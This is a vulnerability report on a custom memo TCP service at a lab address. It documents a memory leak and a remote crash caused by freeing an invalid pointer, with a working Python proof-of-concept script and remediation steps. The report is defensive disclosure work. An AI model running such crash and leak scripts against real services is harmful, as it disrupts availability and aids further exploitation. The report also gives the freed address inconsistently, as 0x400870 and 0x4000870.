# Information Disclosure and Remote DoS in Spiritual Memo TCP Service (Port 7777)

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-02-19 18:57:49 UTC
**Target:** 10.13.37.10:7777 (Spiritual Memo TCP service)
**Endpoint:** TCP menu options [2] Show memo and [3] Delete memo on port 7777
**Method:** TCP
**CVSS:** 6.5

## Description

The Spiritual Memo TCP service listening on 10.13.37.10:7777 contains a memory-management flaw in its memo-handling logic. When interacting with the menu-driven interface, two distinct but related behaviors are observed on a fresh connection without creating any memo:

1) Choosing option [2] “Show memo” returns a fixed sequence of bytes labeled as “Data:” even though no memo has been created. These bytes are not user-controlled and appear to originate from the process address space (likely code or static data), effectively leaking internal memory and a code pointer.

2) Choosing option [3] “Delete memo” immediately, again without having created a memo first, consistently triggers a GLIBC abort with the message free(): invalid pointer: 0x0000000000400870 followed by a detailed backtrace and memory map. This indicates that the application is calling free() on a static or otherwise invalid pointer rather than a dynamically allocated memo buffer, causing the worker process handling that connection to crash.

Together, these behaviors demonstrate an underlying bug in how the service tracks and frees the memo pointer. The bug leads to both information disclosure (process memory and layout via the “Show memo” output and GLIBC error diagnostics) and a deterministic, unauthenticated remote denial-of-service condition.

## Impact

An unauthenticated attacker on the network can exploit this flaw in two ways:

1) Information disclosure
   - By issuing the “Show memo” command (menu option [2]) on a fresh session, the attacker receives a “Data:” line containing bytes read from process memory. The leaked bytes are stable across runs and include at least one in-binary address.
   - When combined with the GLIBC backtrace and memory map produced by the delete-only crash (option [3]), this reveals detailed information about the binary, library versions, internal filesystem paths, and memory layout.
   - These disclosures can significantly lower the bar for developing further memory-corruption exploits against this or similar services by defeating address-space layout randomization (ASLR) and exposing target-specific details.

2) Remote denial of service
   - By issuing the “Delete memo” command (menu option [3]) on a fresh session without having created a memo, the attacker causes GLIBC to detect an invalid free() on a constant pointer and abort the process.
   - Each such request terminates the process handling that connection. If the daemon is not robustly supervised or is single-process, repeated exploitation can render the Spiritual Memo service unreliable or unavailable.
   - Even where a supervisor restarts the service or uses per-connection workers, an attacker can continuously trigger crashes, degrading availability and potentially impacting users who rely on the service.

Overall, the issue combines information disclosure with a reliable, low-effort remote DoS. The confidentiality impact is at least Low due to exposure of internal memory and layout; the availability impact is at least Low due to repeatable process crashes on demand.

## Technical Analysis

Technical overview

The Spiritual Memo service is a custom, menu-driven TCP application listening on port 7777. On each new TCP connection, it presents a banner and menu:

  --==[[ Spiritual Memo ]]==--

  [1] Create a memo
  [2] Show memo
  [3] Delete memo
  [4] Tap out
  >

The expected workflow is to create a memo (option [1]), then show or delete it (options [2] and [3]). However, the implementation of the memo pointer and its lifetime is flawed.

1) Information disclosure via Show memo (option [2]) on a fresh session

On a new TCP connection with no prior interaction other than choosing option [2], the service responds with:

  Data: 1íI\x89Ñ^H\x89âH\x83äðPTIÇÀ\x90\x0e@
  
  --==[[ Spiritual Memo ]]==--
  [1] Create a memo
  [2] Show memo
  [3] Delete memo
  [4] Tap out
  >

The bytes after “Data:” are not influenced by any user-supplied input in this session and remain stable across repeated connections, indicating they are read from a fixed location in the process address space (likely a static pointer or uninitialized buffer).

A hexdump of the leaked bytes shows a consistent pattern, and treating the last 8 bytes as a little-endian 64-bit value yields a constant in-binary address. This effectively discloses part of the binary or mapped code region and provides a code pointer that can be used to defeat ASLR for this process.

2) Freeing an invalid/static pointer via Delete memo (option [3])

On a new TCP connection, immediately choosing option [3] “Delete memo” without having created any memo results in GLIBC aborting the process with a heap corruption error, for example:

  *** Error in `/home/memo/memo': free(): invalid pointer: 0x0000000000400870 ***
  ======= Backtrace: =========
  /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[...]
  /lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[...]
  /home/memo/memo[0x400c98]
  /home/memo/memo[0x400d26]
  /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[...]
  /home/memo/memo[0x400899]
  ======= Memory map: ========
  00400000-00402000 r-xp 00000000 [...] /home/memo/memo
  ...

The invalid pointer address reported by GLIBC (0x0000000000400870) is constant across runs, indicating that the application is calling free() on a fixed static/global address (for example, a pointer in .data/.bss or .rodata) when no memo has actually been allocated.

Because this pointer value is not influenced by user input, the delete-only path provides a reliable but non-controllable memory corruption that GLIBC detects and terminates, resulting in a deterministic process crash (remote DoS) without granting arbitrary code execution or arbitrary free of attacker-chosen addresses.

3) Memo creation and confirmation logic

When following the intended create workflow, the service prompt sequence is:

  [1] Create a memo
  ...
  Data:
  <attacker payload>
  Are you done? [yes/no]

Supplying ordinary values like “yes\n” or “no\n” always leads to an error message:

  Which part of [yes/no] did you not understand?

and the memo is not stored. However, testing shows that a non-standard confirmation “yes\x00\n” is accepted as “yes”:

- After sending “yes\x00\n”, the service prints a “Done!” message and returns to the menu.
- Invoking Show memo (option [2]) then returns:

  Data: HELLO_MEMO

when the attacker originally supplied the payload HELLO_MEMO, demonstrating that:

- A heap buffer is correctly allocated and populated with the attacker’s data.
- The pointer used by Show memo in this case is valid and points to the attacker-controlled buffer.

Crucially, when a memo exists and has been successfully created, subsequent Delete memo (option [3]) operations do not produce the “free(): invalid pointer” error; the crash only occurs when delete is invoked in a state where no memo has been created.

This strongly supports the conclusion that the delete path uses:

- A valid heap pointer when a memo exists (normal behavior).
- A fixed static/global pointer (0x4000870) when no memo exists (buggy behavior).

4) Exploitability analysis

Extensive fuzzing of:

- Memo payload length (from small sizes up to several kilobytes).
- Confirmation strings (including binary data, CRLF, partial matches, and malformed inputs).
- State sequences (e.g., Create→Show→Delete, Create→Delete→Delete, Create→Delete→Show).

did not produce any evidence of:

- Attacker-controlled pointer values being passed to free().
- Heap metadata corruption beyond the fixed invalid free of 0x4000870.
- Stack smashing or other diagnostics suggestive of overwriting return addresses or function pointers.

Two clear, reliable primitives are therefore established:

- Information disclosure: Show memo (option [2]) on a fresh session leaks process memory and at least one stable code pointer.
- Remote DoS: Delete memo (option [3]) on a fresh session calls free() on a static invalid pointer, causing GLIBC to abort the worker process.

No path was identified to escalate these primitives into arbitrary code execution or arbitrary read/write within the constraints of the current implementation, but the disclosed addresses and memory map could be leveraged as a first step in more advanced exploitation chains if other bugs are present.

```
#!/usr/bin/env python3
import socket
import time
import struct


HOST = "10.13.37.10"
PORT = 7777


def recv_until(sock, markers, timeout=3.0):
    """
    Receive data until one of the marker byte strings is seen or timeout/EOF.
    Returns the raw bytes received.
    """
    sock.settimeout(timeout)
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
        if any(m in data for m in markers):
            break
    return data


def parse_data_line(transcript):
    """
    Extract the bytes after 'Data:' up to the next newline, if present.
    """
    marker = b"Data:"
    idx = transcript.find(marker)
    if idx == -1:
        return None
    start = idx + len(marker)
    if start < len(transcript) and transcript[start:start + 1] in (b" ", b"\t"):
        start += 1
    end = transcript.find(b"\n", start)
    if end == -1:
        end = len(transcript)
    return transcript[start:end]


def hexdump(buf):
    return " ".join(f"{b:02x}" for b in buf)


def leak_memory():
    """
    Connect to the Spiritual Memo service and use option [2] Show memo
    without creating any memo first. This reliably leaks bytes from the
    process address space (code/stack region).
    """
    print("[*] Connecting for info leak...")
    s = socket.create_connection((HOST, PORT), timeout=3.0)

    # Read initial banner/menu until '>'
    banner = recv_until(s, [b">"])
    print("[*] Initial banner/menu:")
    print(banner.decode("latin-1", errors="replace"))

    # Trigger Show memo (option 2)
    s.sendall(b"2\n")
    resp = recv_until(s, [b">"])
    print("[*] Response to Show memo (option 2):")
    print(resp.decode("latin-1", errors="replace"))

    leaked = parse_data_line(resp)
    if leaked is None:
        print("[!] No 'Data:' line found in response")
    else:
        print(f"[*] Leaked {len(leaked)} bytes after 'Data:'")
        print("    Raw bytes:", leaked)
        print("    Hex dump :", hexdump(leaked))
        if len(leaked) >= 8:
            qword = struct.unpack("<Q", leaked[-8:])[0]
            print("    Last 8 bytes as little-endian QWORD: 0x%016x" % qword)

    s.close()
    print("[*] Info leak probe done.\n")


def trigger_dos():
    """
    Connect to the Spiritual Memo service and use option [3] Delete memo
    without creating any memo first. This triggers GLIBC to abort with:

      free(): invalid pointer: 0x0000000000400870

    causing the server process handling this connection to crash (remote DoS
    for that worker/process).
    """
    print("[*] Connecting to trigger delete-only crash (DoS)...")
    s = socket.create_connection((HOST, PORT), timeout=3.0)

    banner = recv_until(s, [b">"])
    print("[*] Initial banner/menu:")
    print(banner.decode("latin-1", errors="replace"))

    # Trigger Delete memo (option 3) directly
    s.sendall(b"3\n")
    resp = recv_until(
        s,
        [
            b"free(): invalid pointer",
            b"*** Error in",
            b"Memory map",
            b"stack smashing detected",
        ],
        timeout=5.0,
    )
    print("[*] Response to Delete memo (option 3):")
    print(resp.decode("latin-1", errors="replace"))

    s.close()
    print("[*] Delete-only crash probe done.\n")


def demo_controlled_memo():
    """
    Demonstrate controlled memo contents using the quirky 'yes\\x00\\n'
    confirmation to successfully store and retrieve a memo.
    This is not required for exploitation, but shows the storage behavior.
    """
    print("[*] Connecting to demonstrate controlled memo contents...")
    s = socket.create_connection((HOST, PORT), timeout=3.0)

    banner = recv_until(s, [b">"])
    print("[*] Initial banner/menu:")
    print(banner.decode("latin-1", errors="replace"))

    payload = b"HELLO_MEMO"
    print(f"[*] Sending Create memo (1) with payload: {payload!r}")
    s.sendall(b"1\n")
    _ = recv_until(s, [b"Data:"])

    s.sendall(payload + b"\n")
    _ = recv_until(s, [b"Are you done?"])

    # Use the discovered quirk: 'yes\\x00\\n' is accepted as "yes"
    s.sendall(b"yes\x00\n")
    _ = recv_until(s, [b"--==[[ Spiritual Memo ]]==--", b"Done!"])

    # Show the memo back
    s.sendall(b"2\n")
    resp = recv_until(s, [b">"])
    print("[*] Response to Show memo after creation:")
    print(resp.decode("latin-1", errors="replace"))

    leaked = parse_data_line(resp)
    print("[*] Parsed Data line bytes:", leaked)
    print("[*] Matches payload? :", leaked == payload)

    s.close()
    print("[*] Controlled memo demo done.\n")


def main():
    leak_memory()
    trigger_dos()
    # Optional: demonstrate controlled memo storage/retrieval
    demo_controlled_memo()


if __name__ == "__main__":
    main()
```

## Remediation

Short-term mitigations:

1) Disable or restrict access to the Spiritual Memo service on port 7777 if it is not strictly required, especially from untrusted networks. A firewall rule or access-control list can immediately reduce exposure to this flaw.

2) Ensure that the service is supervised by a robust process manager (e.g., systemd, xinetd, or equivalent) that restarts crashed workers in a controlled manner, and consider rate limiting or connection throttling to reduce the impact of repeated DoS attempts.

Long-term code-level remediation:

1) Correct memo pointer initialization and lifetime management:
   - Initialize the memo pointer to NULL (or equivalent) at the start of each session.
   - After freeing a memo, immediately set the memo pointer back to NULL.
   - Ensure that Delete memo (option [3]) checks whether the memo pointer is NULL before calling free(). If no memo exists, the function should return gracefully without attempting to free.

2) Fix Show memo behavior:
   - Show memo (option [2]) should verify that a memo actually exists (memo pointer is non-NULL) before reading or printing any data.
   - If no memo exists, return a safe message such as “No memo available” rather than reading from uninitialized or static memory.

3) Remove the use of static or hard-coded pointers for dynamic data:
   - Audit the code for any static/global pointers or addresses used as fallbacks when no memo is present.
   - Replace such constructs with properly allocated heap buffers or safe NULL checks to prevent free() from being called on invalid addresses.

4) Harden input parsing and confirmation logic:
   - For the “Are you done? [yes/no]” prompts, use safe, bounded string handling routines that explicitly check expected tokens (“yes” and “no”) without relying on unterminated buffers or partial matches.
   - Normalize input (e.g., trim whitespace, disallow embedded NUL bytes) before comparison to avoid acceptance of ambiguous values like “yes\\x00”.

5) Add defensive logging and testing:
   - Log invalid state transitions (e.g., attempts to delete a non-existent memo) and capture such events in monitoring to detect abuse.
   - Introduce regression tests that cover:
     - Delete memo when no memo exists.
     - Show memo when no memo exists.
     - Creation, display, and deletion of memos for a variety of payload sizes.
   - Include negative tests that verify no data is leaked from uninitialized memory and that invalid free() paths are eliminated.

6) Consider deploying standard memory-safety hardening:
   - Compile with full RELRO, stack canaries, and position-independent executables (PIE) if not already enabled.
   - Use address sanitizer (ASan) or similar tools in a staging environment to detect and correct memory-management issues prior to deployment.

Once the memo pointer handling is corrected and the Show/Delete behaviors are guarded by proper NULL checks, the information disclosure and remote DoS vectors described here should be eliminated.
